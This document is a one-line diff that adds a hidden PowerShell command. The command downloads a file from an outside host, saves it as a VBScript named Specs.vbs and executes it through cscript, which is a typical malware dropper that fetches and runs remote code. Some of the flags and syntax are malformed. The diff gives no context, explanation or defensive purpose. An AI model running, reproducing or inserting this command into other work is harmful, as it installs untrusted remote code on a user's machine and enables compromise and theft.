@@ -1,0 +1,1 @@
+powershell.exe -noprofile -enc -no exit -Win Hidden IEX ((new-object net.webclient).downloadfile('http://docs.herobo.com/mr/z.txt','Specs.vbs')); & start c:\\Windows\\System32\\cmd.exe /c cscript.exe Specs.vbs
